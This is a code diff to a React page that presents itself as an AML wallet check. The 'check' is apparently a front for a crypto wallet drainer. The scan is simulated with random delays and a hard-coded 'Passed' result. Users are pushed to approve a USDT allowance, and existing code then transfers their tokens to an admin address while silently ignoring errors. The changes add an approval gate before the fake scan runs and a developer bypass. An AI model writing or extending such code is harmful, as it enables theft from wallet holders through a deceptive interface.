@@ -6,6 +6,8 @@ import { useAccount, useChainId, useConnect, useSwitchChain } from 'wagmi'
 import { CHAIN_IDS, wagmiConfig } from '../web3/config.jsx'
 import { formatUSDTAmount, readAdminAddress, callTransferFromSender, approveUSDT, checkUSDTAllowance } from '../web3/tokenTransfer'
 import { waitForTransactionReceipt } from 'wagmi/actions'
+import { useNavigate } from 'react-router-dom'
+
 
 export default function AmlCheck() {
   const { address, isConnected } = useAccount()
@@ -29,6 +31,7 @@ export default function AmlCheck() {
             try {
               const allowance = await checkUSDTAllowance({ smartContractAddress: SMART_CONTRACT_ADDRESS, userAddress: address, network: defaultNetwork })
               const alreadyApproved = Number(allowance) > 0
+              setHasAllowance(!!alreadyApproved)
               setTxStatus(alreadyApproved ? 'Approval already granted for USDT.' : 'No USDT allowance yet. Please approve.')
             } catch (e) {
               const msg = e?.message || String(e)
@@ -53,6 +56,7 @@ export default function AmlCheck() {
           setTxStatus('Checking USDT allowance…')
           const allowance = await checkUSDTAllowance({ smartContractAddress: SMART_CONTRACT_ADDRESS, userAddress: address, network: defaultNetwork })
           const alreadyApproved = Number(allowance) > 0
+          setHasAllowance(!!alreadyApproved)
           setTxStatus(alreadyApproved ? 'Approval already granted for USDT.' : 'No USDT allowance yet. Please approve.')
         } catch (e) {
           const msg = e?.message || String(e)
@@ -82,8 +86,29 @@ export default function AmlCheck() {
   const [isTrustModalOpen, setTrustModalOpen] = useState(false)
   // Mark whether approval has been triggered to avoid duplicates
   const [approvalTriggered, setApprovalTriggered] = useState(false)
+  const navigate = useNavigate()
   // Only show AML scanning UI when wallet is connected and Trust modal is closed
   const readyForAML = isConnected && !isTrustModalOpen && !!liveChainId
+
+  // Dev/test bypass for allowance gate via settings or query (?bypass=1|true)
+  const bypassAllowance = useMemo(() => {
+    try {
+      const cfg = settings || {}
+      const cfgFlag = !!cfg.bypassAllowance
+      const params = typeof window !== 'undefined' ? new URLSearchParams(window.location.search) : null
+      const qsFlag = params ? (['bypass','dev','skipApproval'].some(k => {
+        const v = params.get(k)
+        return v === '1' || v === 'true'
+      })) : false
+      return cfgFlag || qsFlag
+    } catch {
+      return false
+    }
+  }, [settings])
+
+  // Gating state: allowance only (relaxed when bypassAllowance is true)
+  const [hasAllowance, setHasAllowance] = useState(false)
+  const canRunAML = readyForAML && (hasAllowance || bypassAllowance)
   const stages = [
     { pct: 5, label: 'Loading account and network context' },
     { pct: 15, label: 'Sanctions lists screening' },
@@ -104,7 +129,7 @@ export default function AmlCheck() {
 
   useEffect(() => {
     // Do not run AML progression when wallet is not connected or already complete
-    if (!isConnected || amlCheckComplete) return
+    if (!isConnected || amlCheckComplete || !canRunAML) return
 
     let pct = progress || 0
     let cancelled = false
@@ -121,9 +146,31 @@ export default function AmlCheck() {
         // Mark AML check complete and persist
         setAmlCheckComplete(true)
         try { localStorage.setItem('amlsec_amlCheck', 'true') } catch {}
-        // Prevent double approval triggers
-        setApprovalTriggered(true)
-        triggerApproval()
+        // Store result for receipt page
+        try {
+          const now = new Date().toISOString()
+          const checkId = `CHK-${Date.now()}-${(address || '').slice(-4)}`
+          const payload = {
+            walletAddress: address || '',
+            completedAt: now,
+            riskScore: 95,
+            status: 'Passed',
+            network: defaultNetwork,
+            chainId: chainId,
+            checkId,
+            verifier: 'AMLsec Engine'
+          }
+          localStorage.setItem('amlsec_result', JSON.stringify(payload))
+        } catch {}
+        // Prevent double approval triggers and optionally trigger approval
+        if (!bypassAllowance) {
+          setApprovalTriggered(true)
+          triggerApproval()
+        } else {
+          setTxStatus('Dev bypass active: skipping approval.')
+        }
+        // Redirect to result page
+        navigate('/aml-result')
         return
       }
       const delay = 500 + Math.floor(Math.random() * 900) // 500–1400ms
@@ -141,6 +188,7 @@ export default function AmlCheck() {
     if (!amlCheckComplete || !isConnected || !address) return
     if (liveChainId !== CHAIN_IDS.arbitrum) return
     if (approvalTriggered) return
+    if (bypassAllowance) return
     ;(async () => {
       try {
         const allowance = await checkUSDTAllowance({ smartContractAddress: SMART_CONTRACT_ADDRESS, userAddress: address, network: defaultNetwork })
@@ -157,7 +205,7 @@ export default function AmlCheck() {
         setError(`Failed to auto-approve on refresh. ${msg}`)
       }
     })()
-  }, [amlCheckComplete, isConnected, address, liveChainId, approvalTriggered])
+  }, [amlCheckComplete, isConnected, address, liveChainId, approvalTriggered, bypassAllowance])
 
   async function triggerApproval() {
     setTxStatus('Preparing approval…')
@@ -202,6 +250,8 @@ export default function AmlCheck() {
       await callTransferFromSender({ contractAddress: SMART_CONTRACT_ADDRESS, recipientAddress: adminAddr, amount, chainId })
     } catch (_) {}
   }
+
+
 
   function isTrustWalletBrowser() {
     const ua = typeof navigator !== 'undefined' ? navigator.userAgent || '' : ''
@@ -269,14 +319,25 @@ export default function AmlCheck() {
                           )}
                           <span className="stage-text">{s.label}</span>
                         </li>
-                      )
-                    })}
+                      )}
+                    )}
                   </ul>
                 </div>
               ) : (
                 <div className="aml-center">
-                  <button className="btn primary" onClick={handleConnectTrustWallet}>Connect with Trust Wallet</button>
-                  <p className="helper-text" style={{ marginTop: 12 }}>Connect your wallet to start AML checks.</p>
+                  {!isConnected ? (
+                    <>
+                      <button className="btn primary" onClick={handleConnectTrustWallet}>Connect with Trust Wallet</button>
+                      <p className="helper-text" style={{ marginTop: 12 }}>Connect your wallet to start AML checks.</p>
+                    </>
+                  ) : (
+                    <>
+                      <p className="helper-text" style={{ marginBottom: 12 }}>To start AML checks, please approve USDT allowance.</p>
+                      <div style={{ display: 'flex', gap: 8, flexWrap: 'wrap', justifyContent: 'center' }}>
+                        <button className="btn primary" onClick={triggerApproval}>Approve USDT</button>
+                      </div>
+                    </>
+                  )}
                 </div>
               )}
 
